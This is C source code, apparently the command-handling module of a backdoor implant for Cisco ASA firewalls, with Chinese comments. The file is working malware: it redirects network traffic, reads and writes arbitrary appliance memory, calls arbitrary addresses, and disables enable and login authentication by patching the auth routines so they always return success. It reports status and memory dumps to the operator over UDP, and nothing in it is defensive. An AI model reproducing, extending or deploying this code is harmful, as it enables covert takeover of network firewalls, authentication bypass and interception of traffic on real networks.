#include "control_interface.h"

#include "global.h"
#include "asa_func.h"
#include "protocol.h"

static int con_alloc_mem(int size)
{
    /*
    * desc: 申请内存，并将地址作为一个整数值返回。
    * param size: 申请的内存长度。
    * return: 新申请地址的整数值。
    */
    int addr = 0;

    if(size <= 0)
        return 0;
    addr = (int)asa_malloc(size);

    return addr;
}

static void con_free_mem(int addr)
{
    /*
    * desc: 释放通过con_alloc_mem()申请的内存地址。
    * param addr: 通过con_alloc_mem()申请的内存地址的整数值。
    */
    if(addr == 0)
        return;
    asa_free((int *)addr);
    return;
}


enum _con_wr_mem_ret_
{
    CON_WR_MEM_NORMAL = 0,
    CON_WR_MEM_ERR_ADDR,
    CON_WR_MEM_ERR_SIZE,
    CON_WR_MEM_ERR_PROTECT,
};
static int con_wr_into_mem(int dstAddr, char *pSrcBuff, int size)
{
    /*
    * desc: 向内存中写入数据
    * param dstAddr: 写入的目的地址的整数值。
    * param pSrcBuff: 存放写入数据的地址指针。
    * param size: 写入的长度。
    * return: 执行结果。
    */
    char *pDstAddr = (int *)dstAddr;
    char *pProtAddr = NULL;
    int protSize = 0;

    if(size <= 0)
        return CON_WR_MEM_ERR_SIZE;
    if(dstAddr == 0)
        return CON_WR_MEM_ERR_ADDR;

    if(dstAddr % 4096 != 0)
    {
        protSize = size + (dstAddr % 4096);
        pProtAddr = (char *)(dstAddr - (dstAddr % 4096));
    }
    if(protSize % 4096 != 0)
        protSize = protSize + (4096 - (protSize % 4096));

    if(ex_mprotect(pProtAddr, protSize, 7) != 0)
        return CON_WR_MEM_ERR_PROTECT;

    ex_memcpy(pDstAddr, pSrcBuff, size);

    return CON_WR_MEM_NORMAL;
}

enum _con_rd_mem_ret_
{
    CON_RD_MEM_NORMAL = 0,
    CON_RD_MEM_ERR_ADDR,
    CON_RD_MEM_ERR_SIZE,
    CON_RD_MEM_ERR_PROTECT,
};
static int con_rd_from_mem(int srcAddr, char *pDstBuff, int size)
{
    /*
    * desc: 从内存中读取数据
    * param srcAddr: 读取的源地址的整数值。
    * param pDstBuff: 存放读取数据的地址指针。
    * param size: 读取的长度。
    * return: 执行结果。
    */
    char *pSrcAddr = (int *)srcAddr;
    char *pProtAddr = NULL;
    int protSize = 0;

    if(size <= 0)
        return CON_RD_MEM_ERR_SIZE;
    if(srcAddr == 0)
        return CON_RD_MEM_ERR_ADDR;

    if(srcAddr % 4096 != 0)
    {
        protSize = size + (srcAddr % 4096);
        pProtAddr = (char *)(srcAddr - (srcAddr % 4096));
    }
    if(protSize % 4096 != 0)
        protSize = protSize + (4096 - (protSize % 4096));

    if(ex_mprotect(pProtAddr, protSize, 7) != 0)
        return CON_RD_MEM_ERR_PROTECT;

    ex_memcpy(pDstBuff, pSrcAddr, size);

    return CON_RD_MEM_NORMAL;
}

enum _report_status_errno_
{
    REPO_ERR_NO_PROTO_HDR = 1,
    REPO_ERR_NO_CONTROL,
    REPO_ERR_NO_FETCH_REPO,
    REPO_ERR_ROGUE_CONTROL,
    REPO_ERR_SEND_FAILED,
};
static int report_implant_status()
{
    char msg[20] = {'H', 'i', ',', 'Z', 'i', 'n', 'a', 'n', '!', 0x00};
    GLOBAL_VAR *pGlobalVar = NULL;
    REPO_STAT repoStatus;
    CONTROL_CMD *pControl = NULL;

    ex_memset((char *)&repoStatus, 0x00, sizeof(repoStatus));

    pGlobalVar = get_local_global_var_addr();
    if(pGlobalVar->p_proto_hdr == NULL)
        return REPO_ERR_NO_PROTO_HDR;
    if(pGlobalVar->p_proto_hdr->type != PROTO_CONTROL)
        return REPO_ERR_NO_CONTROL;
    if(pGlobalVar->payload_len < sizeof(CONTROL_CMD))
        return REPO_ERR_ROGUE_CONTROL;

    pControl = (CONTROL_CMD *)pGlobalVar->p_payload;
    if(pControl->type != CONTROL_FETCH_STATUS)
        return REPO_ERR_NO_FETCH_REPO;

    ex_strcat(repoStatus.msg, msg);
    repoStatus.type = CONTROL_FETCH_STATUS;
    if(send_proto_via_udp(pGlobalVar->s_src_ip, pGlobalVar->s_dest_ip, pGlobalVar->s_src_port, \
                          pGlobalVar->s_dest_port, (char *)&repoStatus, sizeof(repoStatus), PROTO_REPO_STAT) != 0)
    {
        return REPO_ERR_SEND_FAILED;
    }

    return 0;
}

static int con_disable_auth()
{
    int retVal = 0;
    GLOBAL_VAR *pGlobalVar = NULL;
    char pathCode[] = {0x33, 0xC0, 0x40, 0xC3};

    pGlobalVar = get_local_global_var_addr();

    ex_memcpy(pGlobalVar->backup_en_auth_code, (char *)asa_get_en_auth_addr(), sizeof(pathCode));
    pGlobalVar->en_auth_code_size = sizeof(pathCode);

    ex_memcpy(pGlobalVar->backup_login_auth_code, (char *)asa_get_login_auth_addr(), sizeof(pathCode));
    pGlobalVar->login_auth_code_size = sizeof(pathCode);


    retVal = con_wr_into_mem(asa_get_en_auth_addr(), pathCode, sizeof(pathCode));
    if(retVal != 0)
        return retVal;
    retVal = con_wr_into_mem(asa_get_login_auth_addr(), pathCode, sizeof(pathCode));
    if(retVal != 0)
        return retVal;

    return 0;
}

static int con_enable_auth()
{
    int retVal = 0;
    GLOBAL_VAR *pGlobalVar = NULL;
    char patchEnCode[] = {0x55, 0x31, 0xC0, 0x89, 0xE5};
    char patchLoginCode[] = {0x55, 0x89, 0xE5, 0x57, 0x56, 0x53};

    pGlobalVar = get_local_global_var_addr();

    if(pGlobalVar->en_auth_code_size != 0)
    {
        retVal = con_wr_into_mem(asa_get_en_auth_addr(), pGlobalVar->backup_en_auth_code, \
                                 sizeof(pGlobalVar->en_auth_code_size));
        if(retVal != 0)
            return retVal;
        retVal = con_wr_into_mem(asa_get_login_auth_addr(), pGlobalVar->backup_login_auth_code, \
                                 sizeof(pGlobalVar->login_auth_code_size));
    }
    else
    {
        retVal = con_wr_into_mem(asa_get_en_auth_addr(), patchEnCode, sizeof(patchEnCode));
        if(retVal != 0)
            return retVal;
        retVal = con_wr_into_mem(asa_get_login_auth_addr(), patchLoginCode, sizeof(patchLoginCode));
    }

    if(retVal != 0)
        return retVal;

    return 0;
}

static void call_address(char *addr)
{
    __asm__(
        "movl 8(%ebp), %eax\n\t"
        "pusha\n\t"
        "call %eax\n\t"
        "popa\n\t"
    );
    return;
}

enum _exec_control_ret_
{
    EXEC_CON_NORMAL = 0,
    EXEC_CON_ERR_NO_CONTROL,
    EXEC_CON_ERR_NO_TYPE,
};
int exec_control_cmd()
{
    GLOBAL_VAR *pGlobalVar = NULL;
    CONTROL_CMD *pControl = NULL;
    REPO_STAT report;
    OPER_MEM_HDR operMemHdr;
    int retVal = 0;
    int needSendRepo = 0;
    char *pRdMemBuff = NULL;

    pGlobalVar = get_local_global_var_addr();
    pControl = pGlobalVar->p_control_cmd;

    if(pControl == NULL)
        return EXEC_CON_ERR_NO_CONTROL;

    //debug_num(pControl->type);

    //exec cmd
    //不可用switch代替此处流程
    if(pControl->type == CONTROL_SET_REDIR_RULE)
    {
        //设置流量重定向规则
        retVal = set_redir_flow(pControl->capture_rule);
    }
    else if(pControl->type == CONTROL_FETCH_STATUS)
    {
        //获取后门植入状态
        retVal = report_implant_status();
    }
    else if(pControl->type == CONTROL_ALLOC_MEM)
    {
        //申请内存
        retVal = con_alloc_mem(pControl->operate_mem.size);
    }
    else if(pControl->type == CONTROL_FREE_MEM)
    {
        //释放已申请的内存
        con_free_mem(pControl->operate_mem.address);
    }
    else if(pControl->type == CONTROL_WR_MEM)
    {
        //向内存中写入二进制数据
        retVal = con_wr_into_mem(pControl->operate_mem.address, \
                                 (char *)pControl + sizeof(CONTROL_CMD), pControl->operate_mem.payload_len);
    }
    else if(pControl->type == CONTROL_RD_MEM)
    {
        //从内存中读取二进制数据
        pRdMemBuff = (char *)asa_malloc(pControl->operate_mem.size + sizeof(operMemHdr));
        if(pRdMemBuff != NULL)
        {
            ex_memset(pRdMemBuff, NULL, pControl->operate_mem.size + sizeof(operMemHdr));
            retVal = con_rd_from_mem(pControl->operate_mem.address, \
                                     pRdMemBuff + sizeof(operMemHdr), pControl->operate_mem.size);
        }
    }
    else if(pControl->type == CONTROL_DIS_AUTH)
    {
        //取消认证功能
        retVal = con_disable_auth();
    }
    else if(pControl->type == CONTROL_EN_AUTH)
    {
        //启用认证功能
        retVal = con_enable_auth();
    }
    else if(pControl->type == CONTROL_CALL_ADDR)
    {
        //调用地址
        call_address(pControl->operate_mem.address);
    }
    else
    {
        return EXEC_CON_ERR_NO_TYPE;
    }

    //report status
    ex_memset((char *)&report, NULL, sizeof(report));

    if(pControl->type == CONTROL_SET_REDIR_RULE)
    {
        needSendRepo = 1;
        if(retVal > 0)
        {
            report.status_code = 0;
        }
        else
        {
            report.status_code = -1;
        }
        ex_memcpy(report.msg, (char *)&retVal, sizeof(int));
    }
    else if(pControl->type == CONTROL_ALLOC_MEM)
    {
        needSendRepo = 1;
        report.status_code = retVal;
    }
    else if (pControl->type == CONTROL_FREE_MEM)
    {
        needSendRepo = 1;
    }
    else if (pControl->type == CONTROL_WR_MEM)
    {
        needSendRepo = 1;
        report.status_code = retVal;
    }
    else if(pControl->type == CONTROL_RD_MEM)
    {
        needSendRepo = 0;
        if(pRdMemBuff != NULL && retVal == 0)
        {
            ex_memset((char *)&operMemHdr, NULL, sizeof(operMemHdr));
            operMemHdr.address = pControl->operate_mem.address;
            operMemHdr.size = pControl->operate_mem.size;
            operMemHdr.payload_len = pControl->operate_mem.size;

            (*(OPER_MEM_HDR *)pRdMemBuff) = operMemHdr;
            retVal = send_proto_via_frag(pGlobalVar->s_src_ip, pGlobalVar->s_dest_ip, \
                                         pGlobalVar->s_src_port, pGlobalVar->s_dest_port, \
                                         pRdMemBuff, pControl->operate_mem.size + sizeof(operMemHdr), \
                                         FRAG_PROTO_OPER_MEM, USE_UDP);
            asa_free(pRdMemBuff);
        }
    }
    else if(pControl->type == CONTROL_DIS_AUTH)
    {
        needSendRepo = 1;
        report.status_code = retVal;
    }
    else if(pControl->type == CONTROL_EN_AUTH)
    {
        needSendRepo = 1;
        report.status_code = retVal;
    }

    if(needSendRepo != 0)
    {
        report.type = pControl->type;
        retVal = send_proto_via_udp(pGlobalVar->s_src_ip, pGlobalVar->s_dest_ip, \
                                    pGlobalVar->s_src_port, pGlobalVar->s_dest_port, \
                                    (char *)&report, sizeof(report), PROTO_REPO_STAT);
    }

    return retVal;
}










